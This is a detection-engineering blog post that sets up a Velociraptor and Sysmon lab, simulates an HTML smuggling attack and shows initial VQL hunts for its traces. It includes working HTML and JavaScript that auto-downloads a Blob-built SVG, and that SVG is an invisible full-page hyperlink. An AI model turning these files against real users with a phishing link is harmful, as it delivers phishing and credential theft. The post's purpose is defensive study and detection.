---
title: "Hunting HTML Smuggling with Velociraptor: Setting the Stage. Part 1"
date: 2026-06-27
medium_url: https://medium.com/@rabbit_knight/hunting-html-smuggling-with-velociraptor-setting-the-stage-part-1-35268e6c1b5b
---

> **Original Published Article on Medium:** [Hunting HTML Smuggling with Velociraptor: Setting the Stage. Part 1](https://medium.com/@rabbit_knight/hunting-html-smuggling-with-velociraptor-setting-the-stage-part-1-35268e6c1b5b)

### Hunting HTML Smuggling with Velociraptor: Setting the Stage. Part 1

![Article Figure](https://cdn-images-1.medium.com/max/800/1*l8mMhyvKReSiXraj4loRCg.png)

HTML smuggling is not new, but it is increasingly effective. Nobelium (APT29) used it to deliver the EnvyScout (ROOTSAW) dropper, the first link in a chain that ultimately deployed Cobalt Strike beacons during their 2021 campaigns against European governments. QakBot operators wrapped their initial access payloads in HTML smuggling files throughout 2022 and 2023. Emotet adopted the technique when their traditional macro-based delivery started getting caught at the perimeter. These are mature threat groups selecting HTML smuggling deliberately, choosing it over alternatives because it consistently evades the security stack that stops everything else.

The reason it works is architectural. Consider the layers of defense most organizations deploy against email-borne threats. Email security gateways inspect attachments, decompressing archives, scanning for known malicious signatures, and flagging executable content. Network IDS inspects traffic crossing the wire, looking for known bad domains, payload signatures, and anomalous transfer patterns. Sandbox analysis detonates suspicious files in an isolated environment and watches for malicious behavior like process injection, registry modification, or outbound C2 communication.

HTML smuggling bypasses all three simultaneously. The attachment is a plain HTML file containing JavaScript. So no executable headers, no macro-enabled Office format, no embedded OLE object, no archive containing a suspicious payload. Just text. The email gateway has nothing to flag. The payload only materializes on the endpoint itself, assembled in the browser’s memory by JavaScript and written to disk through a Blob URL download. The network never carries the payload because the payload was always inside the HTML, encoded as a string. No HTTP request fetches it from an external server. The sandbox opens the HTML, sees some JavaScript that creates a Blob, and has no behavioral rule that flags a file download initiated by client-side code, because that is what thousands of legitimate web applications do every day.

In this two-part article, I build a detection lab, simulate an HTML smuggling attack from scratch, and then hunt for every forensic trace it leaves behind using Velociraptor. Part 1 covers the lab setup, the attack theory, the simulation, and a preview of the hunt. Part 2 goes deep into the forensic analysis, covering six distinct artifact sources, a custom reusable hunt artifact, and full timeline reconstruction.

The goal is to understand, at the artifact level, exactly what traces HTML smuggling leaves on an endpoint and how to find one.

If you’re interested in the SIEM side of my lab, I covered the Wazuh deployment in a previous article here

#### Velociraptor Overview

Velociraptor is an active endpoint investigation tool. You formulate a question about an endpoint, such as “what SVG files were created in any user’s Downloads folder in the last hour,” create an artifact, hunt, and it goes and gets the answer directly from the live system. Right now. On demand.

I chose it for this investigation for a specific reason. HTML smuggling leaves traces scattered across multiple forensic sources: the filesystem metadata, NTFS alternate data streams, Windows event logs, browser SQLite databases, the Prefetch cache, and the USN Journal. No single log source captures the complete picture of what happened. A SIEM could theoretically aggregate all of these, but only if you pre-configured collection for every source before the attack occurred. In a real incident, you rarely have that luxury. Velociraptor lets me query any of these sources retroactively, without prior configuration, against a live endpoint. That is the difference between “we might have this in our logs” and “let me go check right now.”

The query language is VQL (Velociraptor Query Language), which reads like SQL but operates against live system artifacts instead of database tables. You SELECT columns FROM artifact sources WHERE conditions match. If you can write a SQL query, you can write VQL. The difference is that your data source is not a table sitting in a database. It is a running Windows endpoint with its filesystem, registry, event logs, and process tree all queryable in real time through an agent that runs on the endpoint itself.

Lab Architecture

```
| Role                | OS                    | IP Address     | Notes                        |
|---------------------|-----------------------|----------------|------------------------------|
| Velociraptor Server | Debian 13             | Static         | Also runs Wazuh              |
| Victim Endpoint     | Windows (workstation) | Dynamic (DHCP) | Primary simulation target    |
| Second Client       | Windows Server 2025   | Dynamic (DHCP) | Enrolled, not used as victim |
```

Everything runs on a home server. The Velociraptor server and the endpoints are separate VMs on the same subnet.

The Windows workstation is the victim for a deliberate reason. In real incidents, phishing targets users at workstations. Both clients are enrolled in Velociraptor, but all simulation and hunting activity targets the workstation exclusively.

#### Velociraptor Server Installation

You are generally better off following the official Velociraptor documentation to install your server. It is well-maintained and tracks the current packaging steps more reliably than any third-party walkthrough, mine included. I am documenting my own path here for one reason: it produced a small but instructive deployment problem that the official guide does not warn you about, and watching me dig it out is more useful to you than another copy of the install commands. So I will keep the mechanics brief and spend the words where they earn their keep.

I started by giving Velociraptor a permanent home on the server:

```
sudo 
mkdir
 -p /opt/velociraptor
cd
 /opt/velociraptor
```

That one command, run with sudo, turns out to be the seed of the problem I hit later, so hold that thought.

From there I generated the server configuration using Velociraptor’s interactive wizard. The wizard walks you through the decisions that actually matter: the server’s public DNS name or IP, the frontend bind address that clients connect back to, the GUI bind address, and where the datastore lives on disk. It also creates the first administrator account and sets its password right there in the flow, which is worth noting because it means there is no separate user-creation step to run afterward.

![Article Figure](https://cdn-images-1.medium.com/max/800/1*kB7eVyc94FMcP2rytGs7Kw.png)

With the configuration generated, I built the server package, installed it, and started the service. And this is where the interesting part begins.

The Permission Roadblock

Right after install, the service reported `active (running)`, which looks like success. But the logs underneath were repeating an error on a loop: “Unable to open file /opt/velociraptor/config/inventory.json.db: permission denied”

Here is something that will silently break your deployment if you are not aware of it. The .deb package creates a dedicated velociraptor user and group for security isolation. This is correct practice. The service runs as this unprivileged user rather than root. But if you created /opt/velociraptor beforehand as root (which I did, following the steps above), the directory is owned by root. The service starts, finds it cannot write to its own datastore, and either fails silently or produces cryptic errors with no obvious pointer to the actual problem.

The fix is straightforward:

```
chown
 -R velociraptor:velociraptor /opt/velociraptor
systemctl restart velociraptor_server
```

This is not a user error. It is an interaction between two correct decisions (creating the directory for the download, and the package creating an unprivileged service user) that produces an unexpected failure. I mention it because I have seen it trip up experienced administrators who then spend an hour checking TLS certificates before noticing the ownership mismatch.

Verification

![Article Figure](https://cdn-images-1.medium.com/max/800/1*8FTr-kMBgyMC4_t2KOU4dQ.png)

For the real test, open a browser from another machine on the LAN and go to: https://X.X.X.X:8889 . Accept the self-signed certificate warning, and confirm the login page loads.

![Article Figure](https://cdn-images-1.medium.com/max/800/1*_kTV6LqNsxypBwiBWIdyCA.png)

#### Windows Client Enrollment

There are a couple of ways to install a Windows client, but the one I prefer bakes the configuration directly into the executable so there is no loose config file to lose or corrupt later. Velociraptor calls this config repack.

The first step is getting the client configuration, and the right place to get it is the GUI itself. Logged into the server, the home screen has a download link for the client configuration. It comes down pre-populated with the server’s URL and the cryptographic keys the client needs to authenticate, so there is nothing to hand-edit. Save it as client.config.yaml.

Then download the Windows binary from the official releases page (the file ending in windows-amd64.exe in my case) and put both files in the same folder that you created for Velociraptor on the Windows machine. From an Administrator PowerShell:

```
# 1. Navigate into the folder where you pasted the files
cd "C:\Program Files\Velociraptor"
# 2. Repack: bake the config inside a new self-contained binary
.\velociraptor-windows-amd64.exe config repack .\client.config.yaml velociraptor_cl.exe
# 3. Install and start it as a Windows service
.\velociraptor_cl.exe service install
.\velociraptor_cl.exe service start
# 4. Verify the service is running successfully 
Get-Service velociraptor
```

![Article Figure](https://cdn-images-1.medium.com/max/800/1*nDgkTfL2ENc_O-2D8fx0Xw.png)

![Article Figure](https://cdn-images-1.medium.com/max/800/1*nwHfo6V41q4728n0me4l1Q.png)

The reason I favor repacking over the alternative (running the plain binary with config flag) is robustness. The flag approach leaves the config sitting next to the binary, and if that file is moved or deleted the service breaks silently. The repacked binary carries its config internally and has no external dependency.

Back in the GUI, click Clients in the sidebar and the workstation appears within about thirty seconds. To confirm it is not just enrolled but actually responsive, open its Shell tab and run:

```
SELECT
 
*
 
FROM
 info()
```

![Article Figure](https://cdn-images-1.medium.com/max/800/1*1TyN01DLEuiZBHDB4j6Ytg.png)

![Article Figure](https://cdn-images-1.medium.com/max/800/1*fmBPqLQvKKF1LYzbG-7Jgg.png)

![Article Figure](https://cdn-images-1.medium.com/max/800/1*_0sooWPFJE8gPCv5GCuNLA.png)

A row comes back with the hostname, OS, and architecture. The client is live. I enrolled the Windows Server 2025 box the same way, so the Clients list shows both endpoints, though only the workstation matters for what follows.

#### Sysmon Installation on the Victim

Windows, by default, logs process creation events with minimal detail. Event ID 4688 in the Security log exists, but it requires explicit Group Policy configuration to include the full command line, and even then it does not record parent-child process relationships with the granularity needed for forensic reconstruction. You get “a process started” but not “this process was launched by that process with these exact arguments.” Without Sysmon, the process-creation hunt queries I run later in this article return nothing useful.

Sysmon fills this gap completely. Event ID 1 (Process Create) captures the full command line, the parent process image path, the parent command line, file hashes (MD5, SHA1, SHA256), the user account, and the precise timestamp. For this investigation, Event ID 1 is the critical one because it records exactly which program opened our malicious files and what launched that program. It lets me trace the chain: user double-clicked in Explorer, Explorer launched Edge with the HTML file, Edge later opened with the SVG. That chain is the story of the attack, told through process telemetry.

Download Sysmon from Microsoft’s Sysinternals page and the SwiftOnSecurity Sysmon configuration from GitHub.

Install on the victim workstation:

```
# Ensure the working directory exists (the Sysmon zip should already be extracted here)
New-Item -ItemType Directory -Force -Path 
C
:
\Sysmon 
|
 Out-
Null
# Download the SwiftOnSecurity configuration
Invoke-WebRequest -Uri 
"https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml"
 -OutFile 
"C:\Sysmon\sysmonconfig.xml"
# Install Sysmon and enforce the configuration
Set-Location 
C
:
\Sysmon
.\sysmon64.exe -accepteula -i sysmonconfig.xml
#Verify the service is running
Get-Service Sysmon64
#Verify events are being generated
Get-WinEvent -LogName 
"Microsoft-Windows-Sysmon/Operational"
 -MaxEvents 
5
```

![Article Figure](https://cdn-images-1.medium.com/max/800/1*Rwqe2zR2gCeQnCE3wjXLlA.png)

If both commands return expected output, Sysmon is operational. Without this step, the Sysmon-based hunt queries in the next sections return empty results. Install it before running the simulation, not after.

#### The Attack Explained

The attack I am simulating follows five distinct phases, each mapping to a specific behavior that leaves forensic traces. Understanding the phases helps hunting for them.

Phase 1: Delivery

An HTML file arrives as an email attachment. From the perspective of every security tool inspecting the email, this is a text file containing markup and some JavaScript. It contains no executable code in the traditional sense, no PE headers, no macro-enabled Office format, no embedded objects. Email gateways pass it through. The attachment is just a webpage.

Phase 2: The HTML Smuggling

The victim double-clicks the attachment and the browser renders it, showing a tidy document portal with an OPEN button. While they are reading that page, the JavaScript at the bottom of it is already running, and the sequence it follows is exactly what matters for the forensic traces later.

The script holds the SVG payload as a plain string of markup written directly into the page. It wraps that string into a Blob, a file-like object that exists only in the browser’s memory. It hands the Blob to URL.createObjectURL() to get a temporary internal URL pointing at it. Then it creates an anchor element, sets a download attribute on it, attaches it to the page, and clicks it in code.

The browser’s download mechanism activates. From the browser’s point of view the user clicked a download link, so it writes the Blob’s contents into the Downloads folder as a file. The whole delivery happened inside the browser process, in memory, without a single network request leaving the machine. That is why it is called smuggling. The payload crossed the network boundary hidden inside an innocent HTML file, then reassembled itself on the other side.

One note, many in-the-wild variants Base64-encode the payload string and decode it at runtime with atob() to frustrate content inspection. My lab keeps it deliberately plain, a raw markup string handed straight to the Blob, because the traces it leaves on disk are identical and the mechanism is far easier to read.

![Article Figure](https://cdn-images-1.medium.com/max/800/1*Bea971YoN2_WPdkZS92dQQ.png)

Phase 3: The Trap is Set

An SVG file now sits in the user’s Downloads folder. From a network forensics perspective, this file appeared from nowhere. No HTTP request fetched it from an external server. No DNS query resolved a domain to download it. The file simply appeared on disk, written by the browser’s download mechanism from a Blob URL. Any network-based detection is completely blind to this payload delivery.

Phase 4: The Ambush

The victim sees the SVG in their Downloads folder. Windows associates SVG files with the default browser, and the icon looks like any other image, so they open it expecting a picture or a document preview. What they get is a blank white page. There is nothing visible at all, and that is the point.

The SVG is set to ten thousand by ten thousand pixels, far larger than any monitor, and its single rectangle fills that entire canvas with fill-opacity=”0", which makes it completely transparent. That rectangle is wrapped in a hyperlink. Because the image is so much larger than the window, whatever sliver of it the browser actually shows is all invisible link, and because the rectangle covers the whole canvas there is no part of the page that is not clickable. The victim, staring at what looks like a frozen blank tab, does the natural thing and clicks to see if it responds. Wherever the cursor happens to be, it is inside the link.

![Article Figure](https://cdn-images-1.medium.com/max/800/1*2g3hbdQd-BhDhECMmRgDSg.png)

Phase 5: The Redirect

That click activates the hyperlink embedded in the SVG. The browser navigates to the attacker’s phishing page. From this point, the attacker has the victim on their controlled infrastructure. Credential harvesting, drive-by downloads, or further exploitation can proceed. The initial access chain is complete.

MITRE ATT&CK Mapping

```
| Tactic          | Technique | Detail                                        |
|-----------------|-----------|-----------------------------------------------|
| Initial Access  | T1566.001 | Spearphishing attachment, the HTML file       |
| Defense Evasion | T1027.006 | HTML smuggling, payload assembled client-side |
| Defense Evasion | T1036.008 | SVG masquerading as a harmless image          |
```

The Attack Artifacts

There are two files. The first is the HTML smuggler the victim receives.

```
<!DOCTYPE 
html
>
<
html
>
<
body
>
    
<
h2
>
Document Portal
</
h2
>
    
<
p
>
Your secure document is ready. If the download does not start, click the icon below.
</
p
>
    
<
div
 
id
=
"svgContainer"
>
        
<
svg
 
width
=
"100"
 
height
=
"100"
 
viewBox
=
"0 0 100 100"
 
xmlns
=
"http://www.w3.org/2000/svg"
>
            
<
a
 
href
=
"https://www.microsoft.com/en-us/microsoft-365/outlook/log-in"
 
target
=
"_blank"
>
                
<
rect
 
width
=
"0"
 
height
=
"0"
 />
 
<
rect
 
x
=
"10"
 
y
=
"10"
 
width
=
"80"
 
height
=
"80"
 
fill
=
"#333"
 
rx
=
"10"
 />
                
<
text
 
x
=
"25"
 
y
=
"55"
 
fill
=
"white"
 
font-family
=
"Arial"
 
font-size
=
"12"
>
OPEN
</
text
>
            
</
a
>
        
</
svg
>
    
</
div
>
    
<
script
>
        
// This is "Smuggling" - it creates the file in the browser memory
        
const
 svgContent = 
`<svg width="10000" height="10000" xmlns="http://www.w3.org/2000/svg"><a href="https://www.microsoft.com/en-us/microsoft-365/outlook/log-in" target="_blank"><rect width="10000" height="10000" fill-opacity="0"/></a></svg>`
;
        
const
 blob = 
new
 
Blob
([svgContent], { 
type
: 
'image/svg+xml'
 });
        
const
 url = 
window
.
URL
.
createObjectURL
(blob);
        
        
// This triggers the download automatically
        
const
 a = 
document
.
createElement
(
'a'
);
        a.
href
 = url;
        a.
download
 = 
'cat_document.svg'
;
        
document
.
body
.
appendChild
(a);
        a.
click
();
    
</
script
>
</
body
>
</
html
>
```

A word on the redirect target. In a real attack this link points at a convincing credential-harvesting clone of a login page. For the lab I pointed it at the genuine Microsoft sign-in page instead, so the click leads somewhere harmless while still demonstrating the redirect. The technique is what matters here, not the destination, and you should never point a payload like this at live phishing infrastructure even in a controlled environment.

The second file is the SVG the script drops. It is the svgContent string above, written out to disk as its own file:

```
<
svg
 
width
=
"10000"
 
height
=
"10000"
 
xmlns
=
"http://www.w3.org/2000/svg"
>
  
<
a
 
href
=
"https://www.microsoft.com/en-us/microsoft-365/outlook/log-in"
 
target
=
"_blank"
>
    
<
rect
 
width
=
"10000"
 
height
=
"10000"
 
fill-opacity
=
"0"
/>
  
</
a
>
</
svg
>
```

It is under two hundred bytes. The dimensions are the interesting part. The version of this technique you will most often see documented uses a one-by-one pixel SVG, which gives the victim a single-pixel target they might genuinely miss. Scaling it to ten thousand by ten thousand, with a rect that fills the entire canvas, turns the whole browser window into one invisible button. The victim’s cursor is inside the link no matter where it sits on the page. It is a small change that makes the second stage far more reliable, and it is also a more interesting signature to hunt for.

#### Running the Simulation

The sequence is short:

1. Double-click cat_document.html. It opens in the browser and shows the document portal. 2. Watch the Downloads folder. Within a second or two, cat_document.svg appears on its own. I clicked nothing to make that happen. Note: Depending on your browser settings (such as “Ask where to save each file before downloading”) or if you are running this on a Server OS with strict security defaults, the browser may intercept the script and show a “Save As” prompt instead. This is exactly why the HTML page says “ If the download does not start, click the icon below.” It provides a logical excuse for the prompt, tricking the victim into clicking “Save” without suspicion. 3. Double-click cat_document.svg. The browser opens it to a blank white page. That blankness is the attack working exactly as intended. 4. Click anywhere on the blank page. The browser follows the hidden link and navigates away.

The attack is complete. What matters for the rest of this series is that the evidence now exists across at least six different forensic locations on this endpoint, and the victim saw nothing that looked like an attack.

#### A Taste of the Hunt

Before I close Part 1, let me show you how quickly Velociraptor confirms what just happened.

First, is there an SVG in any user’s Downloads folder that should not be there?

The first way is a raw query, run through Generic.Client.VQL. This is the artifact you reach for whenever you want to throw ad-hoc VQL at a live endpoint instead of running something prepackaged. The path through the GUI is short. Pick the client you want to question, open the Collected Artifacts view from the left panel, and click the + at the top to start a new collection.

![Article Figure](https://cdn-images-1.medium.com/max/800/1*EKEP1kLKye_qFJTHO4gddA.png)

In the search box, type Generic.Client.VQL and select it. Move to Configure Parameters, open the query editor, and drop in the query.

```
SELECT
 FullPath,
       Size,
       Ctime 
AS
 Created,
       hash(path
=
FullPath) 
AS
 Hashes
FROM
 glob(globs
=
"C:/Users/*/Downloads/*.svg")
```

![Article Figure](https://cdn-images-1.medium.com/max/800/1*P9IayfgUBvRakUs1U9vvgA.png)

The screen after that lets you cap resources like the timeout and the row limit; for this lab I left the defaults alone. Then review and launch.

![Article Figure](https://cdn-images-1.medium.com/max/800/1*wX79FKvuUCXuWp0JRZDqPA.png)

glob() walks the filesystem matching that path pattern, and hash() gives me MD5, SHA1, and SHA256 to carry off as indicators of compromise. Back comes a single row: cat_document.svg, 219 bytes, created inside my simulation window. The payload is on disk.

![Article Figure](https://cdn-images-1.medium.com/max/800/1*VLGSmQtWBTK9D9uv1jF1pA.png)

The second way needs no VQL at all. Start another new collection, but this time pick the prebuilt Windows.Search.FileFinder artifact.

In its SearchFilesGlob parameter you type the path you want to sweep, and both of these find the same file:

```
C
:\
Users
\*\
Downloads
\*.
svg
C
:
/Users/
*
/Downloads/
*.
svg
```

![Article Figure](https://cdn-images-1.medium.com/max/800/1*Au4EfKq946dStQEvhcErNg.png)

That mix of slashes is worth pausing on, because it is not a mistake. The same path is written two different ways depending on whether you are typing into code or into a text box, and the reason comes down to how each one is read.

Why the code uses forward slashes. A VQL query is parsed as source, and inside a quoted VQL string a backslash is an escape character, exactly as it is in Python or in a Bash script. If I wrote the glob with native Windows backslashes I would have to double every one of them, C:\\Users\\*\\Downloads\\*.svg, or the parser would read each \ as the start of an escape sequence and the query would break. Velociraptor sidesteps the whole problem by accepting forward slashes as path separators even on a Windows endpoint, so C:/Users/*/Downloads/*.svg stays clean and unambiguous.

Why the GUI box accepts backslashes. The SearchFilesGlob field is not a code editor, so what you type there is never parsed as VQL source. The value is taken literally, which means a single backslash stays a single backslash, with no escape sequence for anything to trip over. And because Velociraptor’s file-finding accessor treats / and \ as the same separator, both forms match the same files. The practical payoff is that you can copy a path straight out of Windows Explorer and paste it into the box without flipping a single slash.

Either route lands on the same answer: one anomalous SVG, in Downloads, that nobody downloaded. That is enough to confirm something happened. It is not enough to prove what. In Part 2 I take that single thread and pull on it through the filesystem journal, the browser’s own download and history databases, and the Windows event log, until I can reconstruct the whole attack from the moment the victim opened the HTML to the final click, second by second.

Part 2: The Hunt, Forensic Investigation with Velociraptor VQL
